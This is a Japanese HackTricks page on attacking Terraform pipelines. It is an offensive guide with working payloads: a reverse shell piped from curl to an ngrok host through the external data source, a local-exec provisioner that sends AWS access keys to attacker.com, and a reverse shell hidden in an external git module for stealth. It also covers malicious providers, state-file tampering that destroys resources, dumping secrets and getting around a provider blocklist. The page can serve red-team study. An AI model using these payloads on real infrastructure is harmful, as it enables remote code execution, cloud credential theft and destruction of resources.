# Terraformセキュリティ

<details>

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、または **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、ハッキングテクニックを共有してください。

</details>
{% endhint %}

## 基本情報

[公式ドキュメントから:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraformは、人間が読み取れる構成ファイルで**クラウドとオンプレミスリソースの両方を定義**できる**インフラストラクチャコードツール**です。これらの構成ファイルをバージョン管理し、再利用し、共有できます。その後、一貫したワークフローを使用して、ライフサイクル全体でインフラストラクチャをプロビジョニングおよび管理できます。Terraformは、コンピューティング、ストレージ、ネットワーキングリソースなどの低レベルコンポーネントだけでなく、DNSエントリやSaaS機能などの高レベルコンポーネントも管理できます。

### Terraformの動作原理

Terraformは、クラウドプラットフォームや他のサービス上のリソースを、それらのアプリケーションプログラミングインターフェース（API）を介して作成および管理します。プロバイダーは、Terraformがアクセス可能なAPIを持つほとんどのプラットフォームやサービスと連携できるようにします。

![](<../.gitbook/assets/image (177).png>)

HashiCorpとTerraformコミュニティは、**1700以上のプロバイダー**をすでに作成しており、さまざまな種類のリソースやサービスを管理できます。この数は増加し続けています。Amazon Web Services（AWS）、Azure、Google Cloud Platform（GCP）、Kubernetes、Helm、GitHub、Splunk、DataDogなど、すべての公開プロバイダーは[Terraform Registry](https://registry.terraform.io/)で見つけることができます。

Terraformの主要なワークフローは次の3つのステージで構成されています:

* **記述:** 複数のクラウドプロバイダーやサービスにまたがるリソースを定義します。たとえば、セキュリティグループとロードバランサーを備えた仮想マシン上にアプリケーションを展開する構成を作成することができます。
* **計画:** Terraformは、既存のインフラストラクチャと構成に基づいて、作成、更新、または破棄するインフラストラクチャを記述した実行計画を作成します。
* **適用:** 承認されると、Terraformは提案された操作を正しい順序で実行し、リソースの依存関係を尊重します。たとえば、VPCのプロパティを更新し、そのVPC内の仮想マシンの数を変更した場合、Terraformは仮想マシンのスケーリング前にVPCを再作成します。

![](<../.gitbook/assets/image (215).png>)

## Terraformラボ

コンピュータにTerraformをインストールしてください。

こちらに[ガイド](https://learn.hashicorp.com/tutorials/terraform/install-cli)があります。また、こちらに[Terraformをダウンロードする最良の方法](https://www.terraform.io/downloads)があります。

## TerraformでのRCE

Terraformには**ウェブページやネットワークサービスを公開するプラットフォームがない**ため、terraformを侵害する唯一の方法は、**terraform構成ファイルを追加/変更できる**ことです。

ただし、terraformは**非常に敏感なコンポーネント**であり、適切に機能するためには**特権アクセス**が必要です。

攻撃者がterraformが実行されているシステムを侵害できる主な方法は、terraform構成を格納するリポジトリを侵害することです。なぜなら、ある時点でそれらが**解釈**されるからです。

実際、**PRが作成された後にterraform plan/applyを自動的に実行する**というソリューションがあります。たとえば、**Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

terraformファイルを侵害できる場合、`terraform plan`または`terraform apply`が実行されたときにRCEを実行するさまざまな方法があります。

### Terraform plan

Terraform planは、terraformで**最も使用されるコマンド**であり、開発者/terraformを使用するソリューションは常にこれを呼び出すため、`terraform plan`で任意のコマンドを実行するterraform構成ファイルを毒入れするのが**最も簡単なRCEの方法**です。

#### 外部プロバイダーの使用

Terraformは、Terraformと外部プログラムの間のインターフェースを提供する[`external`プロバイダー](https://registry.terraform.io/providers/hashicorp/external/latest/docs)を提供します。`external`データソースを使用して、`plan`中に任意のコードを実行できます。

terraform planを実行するときにリバースシェルを実行するようにterraform構成ファイルに注入することで、次のようなことができます:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### カスタムプロバイダの使用

攻撃者は[Terraform Registry](https://registry.terraform.io/)に[カスタムプロバイダ](https://learn.hashicorp.com/tutorials/terraform/provider-setup)を送信し、それをフィーチャーブランチ内のTerraformコードに追加することができます（[こちらの例](https://alex.kaskaso.li/post/terraform-plan-rce)から）。
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
プロバイダは`init`でダウンロードされ、`plan`が実行されると悪意のあるコードが実行されます。

[https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)に例があります。

#### 外部リファレンスの使用

上記のオプションはどちらも有用ですが、あまりステルス性がありません（2番目のオプションはよりステルス性が高いが、最初のものよりも複雑です）。この攻撃をより**ステルス性の高い方法**で実行することができます。以下の提案に従ってください：

* terraformファイルにrevシェルを直接追加する代わりに、revシェルを含む**外部リソースを読み込む**ことができます。
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
rev shellコードは[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)にあります。

* 外部リソースでは、**ref**機能を使用して、リポジトリ内の**terraform rev shellコードをブランチで非表示**にします。例: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform applyを実行してすべての変更を適用します。また、[**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**を注入して**RCEを取得するために悪意のあるTerraformファイルを悪用することもできます。\
次のようなペイロードが`main.tf`ファイルに含まれることを確認するだけです:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
**前のテクニックからの提案に従って**、**外部参照を使用して**、この攻撃を**より慎重に**実行します。

## シークレットのダンプ

`terraform apply`を実行して**terraformで使用されるシークレット値をダンプ**することができます。terraformファイルに次のようなものを追加します：
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform State Filesの悪用

Terraform State Filesに書き込みアクセス権があるが、Terraformコードを変更できない場合、[**この研究**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)では、ファイルを悪用するいくつかの興味深いオプションが示されています：

### リソースの削除 <a href="#deleting-resources" id="deleting-resources"></a>

リソースを破壊する2つの方法があります：

1. **実際のリソースを破壊するために、ステートファイルにランダムな名前のリソースを挿入する**

Terraformはリソースが存在しないと判断するため、それを破壊します（指定された実際のリソースIDに従って）。前のページの例：
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **更新できないようにリソースを削除するようにリソースを変更する**

EC2インスタンスの場合、インスタンスのタイプを変更するだけで、terraformが削除して再作成するようになります。

### RCE

また、[カスタムプロバイダーを作成](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider)し、terraformのステートファイル内のプロバイダーの1つを悪意のあるものに置き換えるか、悪意のあるプロバイダーを持つ空のリソースを追加することも可能です。元の研究からの例：
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## ブラックリストに登録されたプロバイダーの置き換え

`hashicorp/external` がブラックリストに登録されている場合は、以下の手順に従って `external` プロバイダーを再実装することができます。注意: https://registry.terraform.io/providers/nazarewk/external/latest で公開されている外部プロバイダーのフォークを使用しています。独自のフォークや再実装を公開することもできます。
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
その場合、通常通り `external` を使用できます。
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## 監査ツール

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsecは、Terraformコードの静的解析を使用して潜在的なミス構成を見つけます。
* [**terascan**](https://github.com/tenable/terrascan): Terrascanは、インフラストラクチャコードの静的コードアナライザーです。

## 参考文献

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**または**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
